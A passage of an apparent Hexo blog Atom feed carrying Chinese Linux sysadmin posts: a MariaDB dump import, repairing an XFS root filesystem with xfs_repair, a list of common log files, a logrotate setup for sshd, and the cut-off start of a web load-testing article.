class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]<span class="comment"># mysql -u root -p jaking &lt; /root/jakingDB.dump </span></span><br><span class="line">Enter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;</span><br><span class="line">[root@jaking ~]<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;</span><br><span class="line">MariaDB [(none)]&gt; use jaking;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [jaking]&gt; <span class="keyword">SHOW</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| Tables_in_jaking |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| mybook&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.05</span> sec)</span><br><span class="line">MariaDB [jaking]&gt; <span class="keyword">DESCRIBE</span> mybook;</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type&#xA0;&#xA0;&#xA0;&#xA0; | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">| name&#xA0; | char(15) | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| price | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| pages | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br><span class="line">MariaDB [jaking]&gt; <span class="keyword">select</span> * <span class="keyword">from</span> mybook;</span><br><span class="line">+<span class="comment">---------+-------+-------+</span></span><br><span class="line">| name    | price | pages |</span><br><span class="line">+<span class="comment">---------+-------+-------+</span></span><br><span class="line">| jaking1 |    30 |   518 |</span><br><span class="line">| jaking2 |    50 |   518 |</span><br><span class="line">| jaking3 |    80 |   518 |</span><br><span class="line">| jaking4 |   100 |   518 |</span><br><span class="line">+<span class="comment">---------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [jaking]&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x8865;&#x5145;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jaking;</span><br><span class="line"><span class="keyword">use</span> jaking;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mybook (<span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">15</span>),price <span class="built_in">int</span>,pages <span class="built_in">int</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking1&apos;</span>,<span class="string">&apos;30&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking2&apos;</span>,<span class="string">&apos;50&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking3&apos;</span>,<span class="string">&apos;80&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking4&apos;</span>,<span class="string">&apos;100&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mybook;</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x7AE0;&amp;#x8282;&amp;#x7B80;&amp;#x8FF0;&quot;&gt;&lt;a href=&quot;#&amp;#x7AE0;&amp;#x8282;&amp;#x7B80;&amp;#x8FF0;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x7AE0;&amp;#x8282;&amp;#x7B80;&amp;#x8
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux无法挂载sysroot并自动进入紧急模式</title>
    <link href="https://marnm.github.io//posts/aabbd398/"/>
    <id>https://marnm.github.io//posts/aabbd398/</id>
    <published>2022-06-07T04:56:22.000Z</published>
    <updated>2022-06-07T04:58:45.589Z</updated>
    
    <content type="html"><![CDATA[<p>&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x975E;&#x6B63;&#x5E38;&#x5173;&#x673A;&#x4E4B;&#x540E;&#xFF1B;<br>&#x5982;&#x610F;&#x5916;&#x65AD;&#x7535;&#x4E4B;&#x540E;&#xFF0C;&#x4F7F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x72B6;&#x6001;&#xFF0C;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x5F00;&#x673A;</p><p>&#x5F00;&#x673A;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x8FDB;&#x5165;&#x7D27;&#x6025;&#x6A21;&#x5F0F;&#xFF1A;<br><a id="more"></a><br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072148052.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072149556.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150205.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x5F53;&#x5C1D;&#x8BD5;&#x8FDB;&#x884C;&#x6302;&#x8F7D;&#x7684;<code>/sysroot</code>&#x76EE;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#x4E0B;&#x9762;&#x7684;&#x62A5;&#x9519;&#xFF1A;</p><pre><code>mount: can&apos;t find /sysroot in /etc/fstab</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150291.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x4F7F;&#x7528;<code>journalctl -xb</code>&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x62A5;&#x9519;&#x4FE1;&#x606F;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150012.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150628.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151724.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151364.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151116.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151396.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><strong>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</strong><br>&#x9700;&#x8981;&#x4F7F;&#x7528;<code>xfs_repair</code>&#x547D;&#x4EE4;&#x4FEE;&#x590D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[sudo] xfs_repair -v /dev/dm-0</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6216;&#xFF1A;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -L&#x9009;&#x9879;&#x53EF;&#x80FD;&#x4F1A;&#x635F;&#x574F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</span></span><br><span class="line">[sudo] xfs_repair&#xA0;-v&#xA0;-L&#xA0;/dev/dm-0</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果系统出现非正常关机之后；&lt;br&gt;如意外断电之后，使文件系统出现错误状态，导致系统无法正常开机&lt;/p&gt;
&lt;p&gt;开机后会自动进入紧急模式：&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux常见日志文件</title>
    <link href="https://marnm.github.io//posts/15c0e66c/"/>
    <id>https://marnm.github.io//posts/15c0e66c/</id>
    <published>2022-06-07T04:55:52.000Z</published>
    <updated>2022-06-07T04:59:10.380Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>/var/log/message</td><td>&#x5927;&#x591A;&#x6570;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x6D88;&#x606F;&#x8BB0;&#x5F55;&#x5728;&#x6B64;&#x5904;&#x3002;&#x4E5F;&#x6709;&#x4F8B;&#x5916;&#x7684;&#xFF1A;&#x5982;&#x4E0E;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x5904;&#x7406;&#x76F8;&#x5173;&#x7684;&#x5B9A;&#x671F;&#x4F5C;&#x4E1A;&#x4EFB;&#x52A1;&#x7B49;</td></tr><tr><td>/var/log/secure</td><td>&#x5B89;&#x5168;&#x548C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x548C;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;ssh&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#x4EA7;&#x751F;&#x7684;&#x65E5;&#x5FD7;</td></tr><tr><td>/var/log/maillog</td><td>&#x4E0E;&#x90AE;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</td></tr><tr><td>/var/log/cron</td><td>&#x4E0E;&#x5B9A;&#x671F;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</td></tr><tr><td>/var/log/boot.log</td><td>&#x4E0E;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x8BB0;&#x5F55;</td></tr><tr><td>/var/log/dmesg</td><td>&#x4E0E;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x8BB0;&#x5F55;</td></tr><tr><td>/var/log/wtmp</td><td>&#x8BE5;&#x6587;&#x4EF6;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x8BB0;&#x5F55;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x767B;&#x5F55;&#x6B21;&#x6570;&#x548C;&#x6301;&#x7EED;&#x65F6;&#x95F4;&#x7B49;&#x4FE1;&#x606F;&#x3002;&#x53EF;&#x4EE5;&#x7528;last&#x547D;&#x4EE4;&#x67E5;&#x770B;wtmp&#x7684;&#x5185;&#x5BB9;&#x3002;</td></tr><tr><td>/var/log/btmp</td><td>&#x8BB0;&#x5F55;&#x9519;&#x8BEF;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x7684;&#x65E5;&#x5FD7;&#x3002;&#x53EF;&#x4EE5;&#x7528;lastb&#x547D;&#x4EE4;&#x67E5;&#x770B;</td></tr><tr><td></td><td></td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;#x65E5;&amp;#x5FD7;&amp;#x6587;&amp;#x4EF6;&lt;/th&gt;
&lt;th&gt;&amp;#x8BF4;&amp;#x660E;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;/var/log/message&lt;/t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux的日志切割</title>
    <link href="https://marnm.github.io//posts/c4bbfe69/"/>
    <id>https://marnm.github.io//posts/c4bbfe69/</id>
    <published>2022-06-07T04:55:37.000Z</published>
    <updated>2022-06-07T04:59:33.087Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x662F;&#x9759;&#x6001;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x6CA1;&#x6709;&#x670D;&#x52A1;&#x5411;&#x91CC;&#x9762;&#x5199;&#x5185;&#x5BB9;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>split</code>&#x8FDB;&#x884C;&#x5207;&#x5272;<br>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x662F;&#x52A8;&#x6001;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>logrotate</code> &#x8FDB;&#x884C;&#x5207;&#x5272;</p></blockquote><h3 id="logrotate"><a href="#logrotate" class="headerlink" title="logrotate"></a>logrotate</h3><p><code>/etc/logrotate.conf</code> &#x9884;&#x8BBE;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><h3 id="&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;"><a href="#&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;" class="headerlink" title="&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;"></a>&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/logrotate.d/sshd</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/sshd.log{</span><br><span class="line">    missingok</span><br><span class="line">    weekly</span><br><span class="line">    create 0600 root root</span><br><span class="line">    minsize 1M</span><br><span class="line">    rotate 3</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x91CD;&#x542F;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x65E5;&#x5FD7;&#x5207;&#x5272;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logrotate -vf /etc/logrotate.d/sshd</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;"><a href="#&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;" class="headerlink" title="&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;"></a>&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&amp;#x5982;&amp;#x679C;&amp;#x65E5;&amp;#x5FD7;&amp;#x662F;&amp;#x9759;&amp;#x6001;&amp;#x7684;&amp;#xFF0C;&amp;#x6BD4;&amp;#x5982;&amp;#x6CA1;&amp;#x6709;&amp;#x670D;&amp;#x52A1;&amp;#x5
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>web性能压测学习</title>
    <link href="https://marnm.github.io//posts/d185f6ae/"/>
    <id>https://marnm.github.io//posts/d185f6ae/</id>
    <published>2022-06-07T04:55:14.000Z</published>
    <updated>2022-06-07T05:00:05.882Z</updated>
    
    <content type="html"><![CDATA[<h1 id="&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;"><a href="#&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;" class="headerlink" title="&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;"></a>&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;</h1><h2 id="&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;"><a href="#&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;" class="headerlink" title="&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;"></a>&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;</h2><blockquote><p>&#x4EE5;&#x524D;&#xFF1A;&#x672A;&#x51FA;&#x793E;&#x4F1A;&#x4E4B;&#x524D;&#x7ECF;&#x5E38;&#x7528;AB&#x5DE5;&#x5177;&#x6765;&#x538B;&#x6D4B;&#x81EA;&#x5DF1;&#x7684; nginx &#x6B22;&#x8FCE;&#x9875;&#x9762;&#xFF0C;&#x770B;&#x7740;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#x4ECE;20%&#x5230;100%&#xFF0C;&#x53D1;&#x73B0;&#x539F;&#x6765;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x5DE5;&#x5177;&#x90FD;&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x53F0;4C8G&#x7684;&#x865A;&#x62DF;&#x673A;&#x538B;&#x7206;&#x6EE1;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x9677;&#x5165;&#x6C89;&#x601D;&#xFF0C;&#x4F4E;&#x6210;&#x672C;&#x7684;&#x538B;&#x6D4B;&#x90FD;&#x53EF;&#x4EE5;&#x9020;&#x6210;&#x4E00;&#x53F0;&#x865A;&#x62DF;&#x673A;&#x7684;&#x8D44;&#x6E90;&#x6EE1;&#x8D1F;&#x8F7D;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x662F;&#x4E2A;&#x9759;&#x6001;&#x9875;&#x9762;&#xFF0C;&#x90A3;&#x5982;&#x679C;&#x53D1;&#x751F;&#x5728;&#x4F01;&#x4E1A;&#x8EAB;&#x4E0A;&#x4F1A;&#x5982;&#x4F55;&#xFF1F;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;&#x8FDC;&#x8FDC;&#x9AD8;&#x4E8E;&#x538B;&#x6D4B;&#x65B9;&#xFF0C;&#x540E;&#x679C;&#x4E0D;&#x6562;&#x60F3;&#x8C61;&#x3002;</p></blockquote><blockquote><p>&#x73B0;&#x5728;&#xFF1A;&#x6211;&#x627F;&#x8BA4;&#x4EE5;&#x524D;&#x592A;&#x5929;&#x771F;&#x4E86;&#xFF0C;&#x65E2;&#x7136;&#x6709;&#x538B;&#x6D4B;&#x65B9;&#xFF0C;&#x90A3;&#x80AF;&#x5B9A;&#x6709;&#x9632;&#x5FA1;&#x65B9;&#xFF0C;&#x9047;&#x5230;&#x6076;&#x610F;&#x538B;&#x6D4B;&#x4ED6;&#x4EBA;&#x7F51;&#x7AD9;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x5168;&#x5BB6;&#x6876;&#x62C9;&#x9ED1;&#x3001;&#x5C4F;&#x853D;&#x6389;&#x5C31;&#x597D;&#x4E86;&#x3002;&#x90A3;&#x5BF9;&#x4E8E;&#x73B0;&#x5728;&#x4F01;&#x4E1A;&#x6765;&#x8BF4;&#xFF0C;&#x5404;&#x4EBA;&#x89C9;&#x5F97;&#x6700;&#x5927;&#x7684;&#x4EF7;&#x503C;&#x5C31;&#x662F;&#x63A2;&#x6D4B;&#x8D44;&#x6E90;&#x6027;&#x80FD;&#x3001;&#x8D44;&#x6E90;&#x5BB9;&#x91CF;&#x5408;&#x7406;&#x89C4;&#x5212;&#x3001;&#x589E;&#x5F3A;&#x4E1A;&#x52A1;&#x7A33;&#x5B9A;SLA&#x3001;&#x51CF;&#x5C11;&#x4E8B;&#x6545;&#x53D1;&#x751F;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x4E8E;&#x6D4B;&#x8BD5;&#x8FD8;&#x662F;&#x8FD0;&#x7EF4;&#x6765;&#x8BF4;&#x90FD;&#x662F;&#x5929;&#x5927;&#x7684;&#x597D;&#x4E8B;&#xFF0C;&#x4E5F;&#x662F;&#x4EF7;&#x503C;&#x7684;&#x4F53;&#x73B0;&#x3002;</p></blockquote><blockquote><p>&#x672A;&#x6765;&#xFF1A;&#x538B;&#x6D4B;&#x7684;&#x666E;&#x9002;&#x6027;&#xFF0C;&#x5BF9;&#x4F01;&#x4E1A;&#x5E26;&#x6765;&#x7684;&#x4EF7;&#x503C;&#x4E0D;&#x6B62;&#x63A2;&#x6D4B;&#x8D44;&#x6E90;&#x6027;&#x80FD;&#x3001;&#x8D44;&#x6E90;&#x5BB9;&#x91CF;&#x5408;&#x7406;&#x89C4;&#x5212;&#xFF0C;&#x8FD8;&#x6709;&#x6280;&#x672F;&#x67B6;&#x6784;&#x5347;&#x7EA7;&#x9A8C;&#x8BC1;&#x3001;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x4E0A;&#x7EBF;&#x6D4B;&#x8BD5;&#x3001;&#x4E1A;&#x52A1;&#x5CF0;&#x503C;&#x7A33;&#x5B9A;&#x6027;&#x6D4B;&#x8BD5;&#x7B49;&#x7B49;&#xFF0C;&#x901A;&#x8FC7;&#x538B;&#x6D4B;&#x6E05;&#x695A;&#x8D44;&#x6E90;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x964D;&#x4F4E;&#x76F2;&#x76EE;&#x9884;&#x4F30;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x63D0;&#x9AD8;&#x670D;&#x52A1;&#x7684;&#x53EF;&#x7528;&#x6027;&#x548C;&#x7A33;&#x5B9A;&#x6027;&#x3002;</p></blockquote><p><strong>&#x6240;&#x4EE5;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x505A;&#x538B;&#x6D4B;&#xFF1F;</strong><br>&#x538B;&#x6D4B;&#x7684;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x538B;&#x6D4B;(&#x6A21;&#x62DF;&#x771F;&#x5B9E;&#x7528;&#x6237;&#x7684;&#x884C;&#x4E3A;)&#xFF0C;&#x6D4B;&#x7B97;&#x51FA;&#x673A;&#x5668;&#x7684;&#x6027;&#x80FD;(&#x5355;&#x53F0;&#x673A;&#x5668;&#x7684;QPS)&#xFF0C;&#x4ECE;&#x800C;&#x63A8;&#x7B97;&#x51FA;&#x7CFB;&#x7EDF;&#x5728;&#x627F;&#x53D7;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x6570;(100W)&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x591A;&#x5C11;&#x673A;&#x5668;&#x80FD;&#x652F;&#x6491;&#x5F97;&#x4F4F;&#x538B;&#x6D4B;&#x662F;&#x5728;&#x4E0A;&#x7EBF;&#x524D;&#x4E3A;&#x4E86;&#x5E94;&#x5BF9;&#x672A;&#x6765;&#x53EF;&#x80FD;&#x8FBE;&#x5230;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#x7684;&#x4E00;&#x6B21;&#x9884;&#x4F30;(&#x63D0;&#x524D;&#x6F14;&#x7EC3;)&#xFF0C;&#x538B;&#x6D4B;&#x4EE5;&#x540E;&#x901A;&#x8FC7;&#x4F18;&#x5316;&#x7A0B;&#x5E8F;&#x7684;&#x6027;&#x80FD;&#x6216;&#x51C6;&#x5907;&#x5145;&#x8DB3;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x6765;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x7684;&#x4F53;&#x9A8C;&#x3002;</p><h2 id="&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;"><a href="#&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;" class="headerlink" title="&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;"></a>&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;</h2><ol><li>&#x5DE5;&#x5177;&#x8BF4;&#x660E;</li></ol><p>AB&#xFF1A;ApacheBench &#x662F; 